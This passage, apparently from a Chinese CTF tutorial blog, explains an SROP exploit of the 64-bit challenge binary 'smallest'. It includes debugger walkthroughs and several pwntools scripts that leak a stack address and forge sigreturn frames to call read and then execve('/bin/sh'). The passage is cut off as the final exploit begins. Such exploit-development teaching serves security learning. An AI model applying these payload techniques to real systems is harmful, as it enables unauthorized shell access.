+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">install dependencies</span></span><br><span class="line">sudo apt-get install       \</span><br><span class="line">    cmake                  \</span><br><span class="line">    build-essential        \</span><br><span class="line">    libboost-dev           \</span><br><span class="line">    libqt5xmlpatterns5-dev \</span><br><span class="line">    qtbase5-dev            \</span><br><span class="line">    qt5-default            \</span><br><span class="line">    libqt5svg5-dev         \</span><br><span class="line">    libgraphviz-dev        \</span><br><span class="line">    libcapstone-dev        \</span><br><span class="line">    pkg-config</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">build and run edb</span></span><br><span class="line">git clone --recursive https://github.com/eteran/edb-debugger.git</span><br><span class="line">cd edb-debugger</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">./edb</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>请将文件保存为xxx.sh文件，然后在终端运行<br>安装完成之后鼠标双击运行..&#x2F;edb&#x2F;edb-debugger&#x2F;build&#x2F;目录下的edb即可启动</p>
+</blockquote>
+<hr>
+<p>启动edb，将elf文件载入。</p>
+<blockquote>
+<p>如果提示权限不足，在终端中执行chmod 777 smallest 再次运行即可</p>
+</blockquote>
+<h2 id="第一次尝试"><a href="#第一次尝试" class="headerlink" title="第一次尝试"></a>第一次尝试</h2><p>单步步过走到syscall的位置停住，返回到shell界面会等待我们输入，反正是随便输入，输入我都名字就好了-Cyberangel，如下图所示：</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598243079946-dd5e3cf9-3196-44c1-9e09-7933a5836f5d.png" alt="QQ截图20200824122432.png"></p>
+<p>按下回车，rip移动到ret指令，相应的，输入的Cyberangel也被压入栈中：</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598243200227-d92cd8ac-dfd9-453a-b0dd-22a2e5563ede.png" alt="QQ截图20200824122606.png"></p>
+<p>下面程序就要执行ret指令了，我们猜测一下，ret之后程序会报错，单步步过后：</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598243277921-79ea409f-2484-453a-8ac0-3d145b2150a4.png" alt="QQ截图20200824122748.png"></p>
+<p>这是因为输入的字符串Cyberangel被压入到了栈顶，此时rsp指向它，当我们ret时，相当于执行了pop rip和rsp+8，rip指向地址:Cyberangel，这个地址不存在，所以会报错.</p>
+<h2 id="第二次尝试"><a href="#第二次尝试" class="headerlink" title="第二次尝试"></a>第二次尝试</h2><p>从第一次尝试我们可以看到，程序的ret位会返回到我们输入的字符串所代表的的地址，那么假设我们以小端序输入一段地址呢，那ret返回的时候是不是就会返回到我们输入的地址了？</p>
+<p>首先我们还是输入任意字符123456，运行程序将123456压入栈中，然后执行下图的修改:</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598244963593-b55a91c2-b052-4698-9671-2372ffbbef51.png" alt="QQ截图20200824125553.png"></p>
+<p>先点击一下选中“hollk”字符串对应的16进制，然后右键选择Edit Bytes修改栈中数据:</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598245011863-2fb05152-e21f-45c3-95b2-537c560b1742.png" alt="QQ截图20200824125630.png"></p>
+<p>将内容修改为b0 00 40 00 00 00 00 00</p>
+<blockquote>
+<p>请注意这里的小端序</p>
+</blockquote>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598245136340-d2b59184-78cd-4383-9c2d-9059c71bed75.png" alt="QQ截图20200824125845.png"></p>
+<p>点击ok，看一下栈的情况:</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598245165971-0127ddc3-a7b1-4a0c-9966-a2eaa4f3b8d8.png" alt="QQ截图20200824125917.png"></p>
+<p>这样一来就相当于我们输入了一段地址，猜测一下，ret返回到输入的0x00000000004000b0地址，ip指针重新指向xor rax rax</p>
+<p>执行ret指令试试:</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598245494392-e373e3b3-675c-4dab-8dbb-9e3c89149405.png" alt="QQ截图20200824130448.png"></p>
+<p>可以看到程序返回到了0x004000b0处.</p>
+<h2 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2><p>接下来看一下我们getshell的思路:</p>
+<ul>
+<li>利用程序第一次正常调用的read函数向栈中读入payload以部署三个start函数的起始位置,也就是xor rax,rax代码地址（0x00000000004000B0），我们将其记作start_addr</li>
+<li>在第一次执行部署的read函数时，向程序写入“\xb3”， <strong>使得在栈中部署的第二个start_addr</strong> <strong>的地址</strong> <strong>覆盖为</strong> 0x00000000004000B3（请注意：覆盖的并不是start_addr的返回地址）， <strong><span style="color: #F5222D">并使rax寄存器值变为1</span></strong> ，利用系统调用调用write函数。</li>
+<li>控制write函数打印出从当前栈顶开始的0x400个字节的内容，并接受指定信息</li>
+<li>在栈中部署read函数需要对应的寄存器值，调用sigreturn将栈中数据压进寄存器</li>
+<li>在栈中部署&#x2F;bin&#x2F;sh字符串，以及execve函数需要对应的寄存器值，调用sigreturn将栈中数据压进寄存器</li>
+</ul>
+<blockquote>
+<p>看的有点懵?没关系,继续往下看就行了</p>
+</blockquote>
+<hr>
+<blockquote>
+<p>为什么输入’\xb3‘就可以使rax寄存器的值变为1？<br>因为在执行read函数的时候，rax寄存器会起到计数的功能，会记录输入字符串的字节长度，由于’\xb3‘只占1个字节，所以rax寄存器会变为1</p>
+</blockquote>
+<h3 id="控制write函数打印栈地址"><a href="#控制write函数打印栈地址" class="headerlink" title="控制write函数打印栈地址"></a>控制write函数打印栈地址</h3><p>我们为什么要打印栈地址呢？我们在第四步中需要知道read函数将我们部署的内容具体写在了栈的哪个位置，所以需要打印出我们想要部署的位置的地址</p>
+<p>我们前面讲过start函数的代码实际上是进行一个read函数的调用，那么这个调用是由系统调用号来决定的。回顾一下前面start函数的代码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004000B0                 xor     rax, rax</span><br><span class="line">.text:00000000004000B3                 mov     edx, 400h</span><br><span class="line">.text:00000000004000B8                 mov     rsi, rsp</span><br><span class="line">.text:00000000004000BB                 mov     rdi, rax</span><br><span class="line">.text:00000000004000BE                 syscall</span><br><span class="line">.text:00000000004000C0                 retn</span><br></pre></td></tr></table></figure>
+
+<p>rdi寄存器里面的值作为系统调用号，因为rdi寄存器里面的值是rax寄存器赋值的，所以关键就在于rax寄存器。如果想要控制执行write，那么势必不能执行xor rax,rax 的操作(因为write的系统调用号为1)。</p>
+<p>那么想控制write函数需要具备两个条件：</p>
+<ul>
+<li>更改rax寄存器里面的值为1</li>
+<li>越过0x00000000004000B0</li>
+</ul>
+<p>首先看第一个条件，**<span style="color: #F5222D">rax作为一个具有计数功能的寄存器，在使用read函数写的时候会记录写入字符串的字节数(可以看一下下面的图)。</span>**那么我们其实可以控制输入1字节的字符串来控制rax寄存器</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598246373304-d2709650-3952-4532-92d7-73eb8272a593.png" alt="QQ截图20200824131925.png"></p>
+<p>再看第二个条件，如果我们想使用read函数控制rax的话就需要绕过rax清零的操作，那么为何不直接将原有的输入地址覆盖掉呢？如果我们一开始输入三个小端序的0x00000000004000B0（后面讲为什么是三个），分别记做start_addr1、start_addr2、start_addr3</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598246408084-3cc69982-1cef-4e84-b3ee-10142c127339.png"></p>
+<p>那么第一次执行read函数调用后，ret操作对应的rsp指针会指向我们部署的star_addr1</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598246694545-4b3d4707-31af-4dcf-b4cc-078d6bb37d19.png"></p>
+<p>在ret操作之后rsp指针会上移，指向第二个start_addr，即0x00000000004000B0，所以会重新执行read函数。那么第二次执行read函数依然还会从当前的rsp开始写，<span style="color: #F5222D">也就是说我们再一次写字符串的时候就会覆盖掉原有的第二个0x00000000004000B0</span>。<span style="color: #F5222D">如果第这次我们输入“\xb3”的话，即1个字节，不仅可以将rax寄存器中的值变为1，还会覆盖原有的0x00000000004000B0的最后一个字节，就会变成0x00000000004000B3</span></p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598246797380-e51f21e5-d6e6-4185-ac64-2a576a3f2dcf.png"></p>
+<hr>
+<p>test：</p>
+<p>执行read前:</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598247003949-597480d9-1a46-4976-a90e-ed17cc5751d9.png" alt="QQ截图20200824132952.png"></p>
+<p>执行后:</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598247041870-e6eb0ca1-fc36-41ee-9822-5a5a34bf2612.png" alt="QQ截图20200824133033.png"></p>
+<p>可以看到栈顶被覆盖</p>
+<hr>
+<p>那么在第二次执行read函数调用结束之后的ret依然会返回当前rsp指针指向的位置，即从mov edx, 400h这条指令开始，这样一来就会绕过前面的xor rax,rax指令，避免了rax寄存器被清零。并且rsp指针会继续上移指向start_addr3</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598246832755-d5e6eda5-461a-4863-b32a-530471f5946b.png">‘</p>
+<p>因为此时的rax寄存器中的值为1，也就是说syscall调用的系统调用号为1，那么就不会调用read函数，而是write函数，整个的系统调用就会变成syscall(1, 0, rsp, 0x400)，也就是write(0, rsp, 0x400)，这将会打印从栈顶开始的0x400字节的内容。**<span style="color: #F5222D">但是不要忘了，我们部署了三个start_addr，所以还需要从start_addr3的下一位地址进行取值，</span>**我们将取到的新栈顶记做stack_addr</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598248241327-b4786695-ff49-4120-b468-ee96ebf1512a.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">small = ELF(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span> <span class="comment">#源代码syscall处地址</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span>  <span class="comment">#源代码xor rax,rax处地址</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span>  <span class="comment">#部署三个start_addr，完成三次read函数的调用</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖第二个start_addr的最后一个字节变成0x00000000004000B3，</span></span><br><span class="line"><span class="comment">#越过对rax寄存器的清零，还使得rax寄存器值变为1</span></span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)  </span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>]) <span class="comment">#程序调用write函数，使用recv模块接收接下要要部署的栈顶地址</span></span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用sigreturn对read函数调用的寄存器进行部署"><a href="#使用sigreturn对read函数调用的寄存器进行部署" class="headerlink" title="使用sigreturn对read函数调用的寄存器进行部署"></a>使用sigreturn对read函数调用的寄存器进行部署</h4><p>接下来就需要注意了，我们进入构造的阶段。我们需要通过sigreturn的调用来实现对read函数调用寄存器的部署。值得高兴的是pwntools中已经有了调用sigreturn的功能，所以在写EXP的时候可以直接使用。再部署之前我们需要之想好在哪几个寄存器中部署什么值，下面列出来一一讲解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------</span><br><span class="line">| 寄存器和指令 |      存储数据      | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rax     |  read函数系统调用号 | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rdi     |         0         | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rsi     |    stack_addr     | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rdx     |       0x400       | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rsp     |    stack_addr     | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rip     |    syscall_ret    | </span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>首先是rax寄存器中一定是存放read函数的系统调用号啦，因为原汇编代码使用的是syscall，这个不多说了</li>
+<li>rdi寄存器作为read函数的一参，0代表标准输入</li>
+<li>rsi寄存器作为read函数的二参，里面存放的是前面通过write函数打印出来的新栈顶的地址， <strong><span style="color: #F5222D">也就是说将接收到的信息写到我们前面通过write函数打印的新栈顶的位置</span></strong></li>
+<li>rdx作为read函数的三参写0x400个字节</li>
+<li>rsp寄存器需要和rsi保持一致，在写的时候写在rsp指向的位置</li>
+<li>rip寄存器指向syscall_ret，确保在read函数寄存器部署成功之后可以直接调用read函数</li>
+</ul>
+<p>这些就是我们需要部署的内容，那么怎么将这些东西按照我们想象的结构部署到寄存器中呢？这个时候就用到了前面的signal机制的漏洞了：<strong>当 signal handler 执行完成后就会执行 sigreturn 系统调用来恢复上下文，主要是将之前压入的寄存器的内容给还原回对应的寄存器，然后恢复进程的执行</strong></p>
+<p>就是利用这个原理，<span style="color: #F5222D">我们将想要部署的寄存器内容以字符串的方式部署在栈中，之后调用sigreturn将栈中部署的内容还原到对应的寄存器。</span>当然只有read函数寄存器部署是不够的，还需要调用sigreturn才行</p>
+<p>那么解决方法无非就是将rax寄存器中的值改成sigreturn的系统调用号15，然后再进行syscall就可以了。和前面的write函数调用差不多，下面演示一下栈布局</p>
+<p>前面write函数执行结束之后ret为当前的rsp指针，即start_addr3位置（往上翻看上一个图）。在执行ret返回后rsp指针会进行上移，也就是指向start3_addr的高一个地址，这个时候会重新第三次执行read函数，也就是说会向当前rsp指针位置重新写。这个时候就可以把我们预想的sigreturn调用和read函数寄存器布局写到栈中了，即输入下方payload</p>
+<blockquote>
+<p>payload &#x3D; start_addr + syscall_ret + frame(read)</p>
+</blockquote>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598248486208-37a53113-230b-41b9-a2e1-ab404912c2bc.png"></p>
+<p>输入之后栈中的布局如上图所示，在第三次read函数调用结束之后的ret位会回到当前rsp指向的地址，也就是还会第四次调用read函数，这个时候rsp指针还会上移至syscall_ret</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598248508107-cf99f1d2-da22-4b94-b2d8-d8be5dd7fd49.png"></p>
+<p>由于正在执行第四次read函数，所以shell界面还会等待我们输入，此时输入的值就是为了更改rax寄存器里面的值，此时更改的作用是为了接下来调用sigreturn函数，所以我们需要将rax寄存器中的值变为15，也就是说需要写15个字节。但是有个问题出现了，当前rsp指针指向的位置是syscall，所以我们写的内容会覆盖syscall的内容。那么如果我们写的内容和原有的栈中的内容一样的话，无论怎么覆盖都不会影响原有在栈中的部署结构</p>
+<p>所以这个时候我们取原有payload从第8个字节到第8+15字节的内容，也就是正好15个字节。为什么要从第8个字节开始呢？需要注意的是原有的payload是从star_addr开始的，但是我们当前的rsp是从syscall开始的，所以我们要越过start_addr的8个字节，这样一来我们输入的内容就不会破坏原有部署的栈结构，还能使得rax寄存器中的值变为15</p>
+<p>这样一来程序运行到原有的syscall的时候就会直接调用sigreturn，将我们在栈中部署的read函数的寄存器内容部署到寄存器中。当原程序运行到ret操作的时候，rsp刚好指向syscall_ret长度位置（见上图）。那么这个时候就会直接根据我们部署在寄存器中的read函数的内容调用read函数，此时shell界面会再一次等待我们输入</p>
+<blockquote>
+<p>需要注意的是这个时候调用的read函数并不再是在栈中部署的start_addr了，而是通过寄存器里面的值进行调用的，因为我们ret位返回到的是syscall，越过了源代码中对寄存器的值操作的部分，直接进行系统调用由于我们需要知道接下来需要部署到哪个位置，前面write函数泄露了一个可控的栈地址stack_addr，所以read函数的二参需要填写stack_addr</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">small = ELF(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span> <span class="comment">#源代码syscall处地址</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span>  <span class="comment">#源代码xor rax,rax处地址</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span>  <span class="comment">#部署三个start_addr，完成三次read函数的调用</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖第二个start_addr的最后一个字节变成0x00000000004000B3，越过对rax寄存器的清零，还使得rax寄存器值变为1</span></span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)  </span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>]) <span class="comment">#接收接下要要部署的栈顶地址</span></span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = constants.SYS_read <span class="comment">#read函数系统调用号</span></span><br><span class="line">read.rdi = <span class="number">0</span>  <span class="comment">#read函数一参</span></span><br><span class="line">read.rsi = stack_addr  <span class="comment">#read函数二参</span></span><br><span class="line">read.rdx = <span class="number">0x400</span>  <span class="comment">#read函数三参</span></span><br><span class="line">read.rsp = stack_addr  <span class="comment">#和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr</span></span><br><span class="line">read.rip = syscall_ret <span class="comment">#使得rip指向syscall的位置，在部署好read函数之后能直接调用</span></span><br><span class="line">payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">str</span>(read)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])  <span class="comment">#输入15个字节使得rax寄存器的值为15，进行sigreturn调用</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用sigreturn对execve函数调用的寄存器进行部署"><a href="#使用sigreturn对execve函数调用的寄存器进行部署" class="headerlink" title="使用sigreturn对execve函数调用的寄存器进行部署"></a>使用sigreturn对execve函数调用的寄存器进行部署</h4><p>这部分和上一部分部署的方式近乎相同，也是通过sigreturn对寄存器部署，只是有几点小小的区别：</p>
+<ul>
+<li>execve函数的调用我们只需要对rdi寄存器部署，存放&#x2F;bin&#x2F;sh字符串所在地址就可以了，rsi寄存器和rdx寄存器置零就可以了</li>
+<li>不止需要对execve函数所用的寄存器进行部署，还需要考虑&#x2F;bin&#x2F;sh字符串放在哪个位置</li>
+<li>由于前面在部署read函数寄存器的时候rsi寄存器中的值为之前write函数泄露出来的stack_addr，所以这次的位置是从stack_addr开始写的</li>
+</ul>
+<p>接下来还是从对寄存器部署内容开始：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------</span><br><span class="line">| 寄存器和指令 |      存储数据      | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rax     | execve函数系统调用号| </span><br><span class="line">----------------------------------</span><br><span class="line">|    rdi     |     binsh_addr    | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rsi     |         <span class="number">0</span>         | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rdx     |         <span class="number">0</span>         | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rsp     |    stack_addr     | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rip     |    syscall_ret    | </span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>对寄存器的构造和前面对read函数部署大致相同，只不过是函数的参数有所改变导致寄存器中的值不一样，就不多讲了</p>
+<p>接下来我们需要考虑的就是&#x2F;bin&#x2F;sh字符串应该放在哪个位置，这个时候就需要进行计算了，依照前面部署read函数寄存器的方法，我们也规划一下部署execve在栈中的payload结构。主要方法差不多首先返回到原有的xor rax,rax命令处，使shell界面等待我们输入，输入的字节长度为15，作为sigreturn的系统调用号存放在rax寄存器中，然后将在栈中部署好的execve寄存器值转移至相应寄存器中完成对execve的调用。函数调用payload如下：</p>
+<blockquote>
+<p>payload_exe &#x3D; start_addr + syscall_ret + frame(execve)</p>
+</blockquote>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598248632688-7e3f6684-0deb-4bc7-98b9-6c267490e186.png"></p>
+<p>那么到这为止我们函数调用的方面就已经部署好了，如果想知道&#x2F;bin&#x2F;sh字符串的地址，就需要知道前面payload_exe的长度时多少，这个长度没法直接通过查找去计算，因为pwntools里面的SigreturnFrame函数是集成好的，我也没找到这个函数具体的长度是多少，不过没有关系，可以直接len(payload_exe)输出看一下就可以了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">small = ELF(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span> <span class="comment">#源代码syscall处地址</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span>  <span class="comment">#源代码xor rax,rax处地址</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span>  <span class="comment">#部署三个start_addr，完成三次read函数的调用</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖第二个start_addr的最后一个字节变成0x00000000004000B3，越过对rax寄存器的清零，还使得rax寄存器值变为1</span></span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)  </span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>]) <span class="comment">#接收接下要要部署的栈顶地址</span></span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = constants.SYS_read <span class="comment">#read函数系统调用号</span></span><br><span class="line">read.rdi = <span class="number">0</span>  <span class="comment">#read函数一参</span></span><br><span class="line">read.rsi = stack_addr  <span class="comment">#read函数二参</span></span><br><span class="line">read.rdx = <span class="number">0x400</span>  <span class="comment">#read函数三参</span></span><br><span class="line">read.rsp = stack_addr  <span class="comment">#和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr</span></span><br><span class="line">read.rip = syscall_ret <span class="comment">#使得rip指向syscall的位置，在部署好read函数之后能直接调用</span></span><br><span class="line">payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">str</span>(read)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])  <span class="comment">#输入15个字节使得rax寄存器的值为15，进行sigreturn调用</span></span><br><span class="line"></span><br><span class="line">execve = SigreturnFrame()</span><br><span class="line">execve.rax = constants.SYS_execve</span><br><span class="line"><span class="comment"># &quot;/bin/sh&quot;字符串地址，这里为了能够让exp3.1正常执行，所以直接给了0x120，下面会将为什么是0x120</span></span><br><span class="line">execve.rdi = stack_addr + <span class="number">0x120</span>  </span><br><span class="line">execve.rsi = <span class="number">0x0</span> <span class="comment">#execve函数二参</span></span><br><span class="line">execve.rdx = <span class="number">0x0</span> <span class="comment">#execve函数二参</span></span><br><span class="line">execve.rsp = stack_addr </span><br><span class="line">execve.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">str</span>(execve)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(frame_payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>可以看到payload_exe的长度为264个字节，也就是十六进制的0x108个字节，也就是说我们将&#x2F;bin&#x2F;sh字符串部署在payload_exe后面就可以了，也就是说&#x2F;bin&#x2F;sh字符串的地址要大于stack_addr + 0x108的地址，当然尽可能的接近这个地址就可以了，不需要将偏移调的太大。所以凑个整我们就把&#x2F;bin&#x2F;sh字符串放在stack_addr + 0x120的位置就好了</p>
+<p>那么我们的payload就需要更改一下了，因为我们的&#x2F;bin&#x2F;sh字符串要同payload_exe一起写进栈中，那么&#x2F;bin&#x2F;sh字符串前面的空位就需要填充一下：</p>
+<blockquote>
+<p>payload &#x3D; payload_exe + (0x120 - len(payload_exe)) * ‘\x00’ + ‘&#x2F;bin&#x2F;sh\x00’</p>
+</blockquote>
+<p>这样一来我们完整的EXP就构筑好了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 